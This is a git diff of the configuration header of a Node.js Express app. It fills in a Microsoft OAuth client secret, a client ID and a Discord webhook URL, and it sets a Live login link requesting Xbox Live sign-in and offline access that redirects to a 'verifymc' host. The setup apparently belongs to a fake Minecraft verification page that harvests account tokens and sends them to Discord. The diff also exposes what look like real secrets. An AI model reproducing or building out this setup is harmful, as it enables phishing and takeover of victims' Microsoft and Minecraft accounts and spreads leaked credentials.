@@ -1,11 +1,11 @@
 //Change these btw
-const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = ''
+const client_secret = 'swT8Q~5nLIpkzR6VjyP9lII5m6jJR8tGg5t4ebAC' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '9a6afb84-bb63-470f-b451-4df9197c2aa5'
 const redirect_uri = 'https://verifymc-h1av.onrender.com'
-const webhook_url = ''
+const webhook_url = 'https://discord.com/api/webhooks/1048927881016909925/BP_G-rNFa_l2hYZSZS-gHPe7dorSDNf7djILvAjmQ2W7iDsuhfXQd05KBnLaP1mB7t5c'
 
 //Requirements
-const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id=50da015c-bbfe-4726-bda2-1e0b21c999f6&response_type=code&redirect_uri=https://verification-bot-u46e.onrender.com&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
+const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id=9a6afb84-bb63-470f-b451-4df9197c2aa5&response_type=code&redirect_uri=https://verifymc-h1av.onrender.com&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const express = require('express')
 const app = express()
